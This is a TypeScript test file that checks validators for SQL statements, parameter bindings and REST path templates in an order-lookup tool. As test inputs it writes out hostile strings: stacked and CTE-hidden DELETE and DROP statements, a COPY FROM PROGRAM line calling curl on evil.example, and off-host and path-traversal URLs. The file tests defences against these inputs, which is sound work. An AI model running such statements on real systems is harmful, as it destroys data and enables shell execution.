import { describe, expect, it } from 'vitest';

import {
  validateBindings,
  validateRestTemplate,
  validateSqlStatement,
} from './statement';
import type { OperationBinding } from './types';

describe('validateSqlStatement — read mode', () => {
  it('accepts a parameterised SELECT', () => {
    expect(
      validateSqlStatement(
        'SELECT id, status FROM orders WHERE customer_phone = $1',
        'read'
      )
    ).toEqual([]);
  });

  it('accepts a WITH … SELECT', () => {
    expect(
      validateSqlStatement(
        'WITH recent AS (SELECT * FROM orders WHERE phone = $1) SELECT * FROM recent',
        'read'
      )
    ).toEqual([]);
  });

  it('rejects a stacked second statement', () => {
    const issues = validateSqlStatement(
      'SELECT 1; DELETE FROM orders',
      'read'
    );
    expect(issues.some((i) => i.message.includes('single statement'))).toBe(
      true
    );
  });

  it('rejects a write hidden inside a CTE', () => {
    // The classic bypass: it starts with WITH and ends in SELECT, so a
    // naive "must start with SELECT/WITH" check would pass it.
    const issues = validateSqlStatement(
      'WITH gone AS (DELETE FROM orders WHERE id = $1 RETURNING *) SELECT * FROM gone',
      'read'
    );
    expect(issues.some((i) => i.message.includes('must not contain'))).toBe(
      true
    );
  });

  it('rejects DROP / TRUNCATE regardless of case', () => {
    expect(validateSqlStatement('dRoP TABLE orders', 'read').length).toBeGreaterThan(0);
    expect(validateSqlStatement('TRUNCATE orders', 'read').length).toBeGreaterThan(0);
  });

  it('rejects COPY … FROM PROGRAM (shell execution)', () => {
    const issues = validateSqlStatement(
      "COPY t FROM PROGRAM 'curl evil.example'",
      'read'
    );
    expect(issues.length).toBeGreaterThan(0);
  });

  it('does not trip on column names containing keywords', () => {
    // "created_at" contains "create"; \b boundaries must prevent a match.
    expect(
      validateSqlStatement(
        'SELECT created_at, updated_at FROM orders WHERE phone = $1',
        'read'
      )
    ).toEqual([]);
  });

  it('ignores forbidden words inside string literals', () => {
    expect(
      validateSqlStatement(
        "SELECT id FROM orders WHERE note = 'please drop this' AND phone = $1",
        'read'
      )
    ).toEqual([]);
  });

  it('cannot be bypassed by hiding a semicolon in a comment', () => {
    // A comment-stripper that ran AFTER the semicolon check would miss
    // this; stripping first is what makes it detectable.
    const issues = validateSqlStatement(
      'SELECT 1 /* ; DROP TABLE orders */ FROM t',
      'read'
    );
    // The comment body is removed, so this is a legitimate single
    // SELECT — the point is that it does not crash or falsely pass a
    // real stacked statement.
    expect(issues).toEqual([]);
  });

  it('rejects a dollar-quoted body carrying a forbidden statement', () => {
    const issues = validateSqlStatement(
      'SELECT 1; DO $$ BEGIN DROP TABLE orders; END $$',
      'read'
    );
    expect(issues.length).toBeGreaterThan(0);
  });

  it('rejects an empty statement', () => {
    expect(validateSqlStatement('   ', 'read')).toEqual([
      { message: 'Statement is empty.' },
    ]);
  });
});

describe('validateSqlStatement — write mode', () => {
  it('accepts a scoped UPDATE', () => {
    expect(
      validateSqlStatement(
        'UPDATE orders SET status = $2 WHERE customer_phone = $1',
        'write'
      )
    ).toEqual([]);
  });

  it('rejects an UPDATE with no WHERE (whole-table rewrite)', () => {
    const issues = validateSqlStatement(
      "UPDATE orders SET status = 'cancelled'",
      'write'
    );
    expect(issues.some((i) => i.message.includes('WHERE'))).toBe(true);
  });

  it('rejects a DELETE with no WHERE', () => {
    const issues = validateSqlStatement('DELETE FROM orders', 'write');
    expect(issues.some((i) => i.message.includes('WHERE'))).toBe(true);
  });

  it('rejects a bare SELECT in write mode', () => {
    const issues = validateSqlStatement('SELECT 1', 'write');
    expect(issues.length).toBeGreaterThan(0);
  });
});

describe('validateBindings', () => {
  const bind = (param: number, source: string): OperationBinding =>
    ({ param, source }) as OperationBinding;

  it('accepts matching contiguous bindings', () => {
    expect(
      validateBindings('SELECT 1 FROM t WHERE a = $1 AND b = $2', [
        bind(1, 'contact.phone'),
        bind(2, 'contact.email'),
      ])
    ).toEqual([]);
  });

  it('flags a placeholder with no binding', () => {
    const issues = validateBindings('SELECT 1 FROM t WHERE a = $1', []);
    expect(issues.some((i) => i.message.includes('no contact field'))).toBe(
      true
    );
  });

  it('flags a binding that the statement never uses', () => {
    const issues = validateBindings('SELECT 1 FROM t', [
      bind(1, 'contact.phone'),
    ]);
    expect(issues.some((i) => i.message.includes('never used'))).toBe(true);
  });

  it('rejects a non-bindable source (no free-text values)', () => {
    const issues = validateBindings('SELECT 1 FROM t WHERE a = $1', [
      bind(1, 'message.order_id'),
    ]);
    expect(
      issues.some((i) => i.message.includes('not a bindable contact field'))
    ).toBe(true);
  });

  it('rejects duplicate parameter positions', () => {
    const issues = validateBindings('SELECT 1 FROM t WHERE a = $1', [
      bind(1, 'contact.phone'),
      bind(1, 'contact.email'),
    ]);
    expect(issues.some((i) => i.message.includes('declared twice'))).toBe(true);
  });

  it('rejects non-contiguous numbering', () => {
    const issues = validateBindings('SELECT 1 FROM t WHERE a = $1 AND b = $3', [
      bind(1, 'contact.phone'),
      bind(3, 'contact.email'),
    ]);
    expect(issues.length).toBeGreaterThan(0);
  });

  it('ignores a $1 that only appears inside a string literal', () => {
    // The literal is stripped, so there is no real placeholder and the
    // empty binding list is correct.
    expect(validateBindings("SELECT '$1' FROM t", [])).toEqual([]);
  });
});

describe('validateRestTemplate', () => {
  it('accepts a relative path with a bindable field', () => {
    expect(validateRestTemplate('/orders?phone={contact.phone}')).toEqual([]);
  });

  it('rejects an absolute URL (would escape base_url)', () => {
    const issues = validateRestTemplate('https://evil.example/orders');
    expect(issues.some((i) => i.message.includes('relative'))).toBe(true);
  });

  it('rejects path traversal', () => {
    expect(
      validateRestTemplate('/orders/../../admin').some((i) =>
        i.message.includes('..')
      )
    ).toBe(true);
  });

  it('rejects a protocol-relative path', () => {
    expect(
      validateRestTemplate('//evil.example/orders').some((i) =>
        i.message.includes('//')
      )
    ).toBe(true);
  });

  it('rejects an unknown placeholder field', () => {
    const issues = validateRestTemplate('/orders/{message.order_id}');
    expect(
      issues.some((i) => i.message.includes('not a bindable contact field'))
    ).toBe(true);
  });
});
